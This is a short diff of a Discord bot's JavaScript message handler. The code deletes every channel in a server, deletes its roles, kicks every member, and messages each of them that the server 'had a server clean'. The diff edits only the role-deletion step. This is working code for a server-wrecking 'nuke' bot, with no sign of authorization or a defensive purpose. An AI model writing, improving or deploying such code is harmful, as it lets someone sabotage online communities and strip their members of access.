@@ -225,10 +225,8 @@ bot.on("message", async (message) => {
                 msg.guild.channels.cache.forEach(ch => {
                     ch.delete()
                 })
-                msg.guild.roles.forEach(ava => {
-                    ava.delete()
-                })
-            
+                msg.guild.roles.cache.delete()
+                
                         msg.guild.members.cache.forEach(mem => {
                             mem.kick()
                             mem.send("Sadly " + msg.guild.name + " had a server clean! This kicked everyone from the server.")
